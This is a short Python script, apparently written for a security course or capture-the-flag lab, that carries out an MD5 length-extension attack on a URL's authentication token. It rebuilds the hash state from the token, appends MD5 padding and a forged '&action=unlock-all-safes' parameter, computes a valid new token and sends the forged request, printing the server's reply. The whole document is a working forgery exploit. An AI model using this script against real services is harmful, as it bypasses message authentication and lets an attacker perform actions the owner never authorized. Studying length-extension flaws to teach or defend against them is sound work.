from pymd5 import md5, padding
from codecs import decode
from urllib import parse
import requests
import sys

url = sys.argv[1]
actionNumber = str(url.count("&action") + 1)
originalParams = "user=" + url.split("&user=")[1]
splitedURL = url.split("&user=")[0].split("token=")
startOfURL = splitedURL[0] + "token="
token = splitedURL[1]

msglen = len(originalParams) + 8
bits = (msglen + len(padding(msglen*8)))*8
md5Hash = md5(state=decode(token, "hex"), count=bits)
attack = "&action" + str(actionNumber) +"=unlock-all-safes"
md5Hash.update(attack)
newToken = md5Hash.hexdigest()
hashPadding = parse.quote(padding(msglen*8))

newURL = startOfURL + newToken + "&" + originalParams + hashPadding + attack

req = requests.get(url=newURL)
print(req.text)

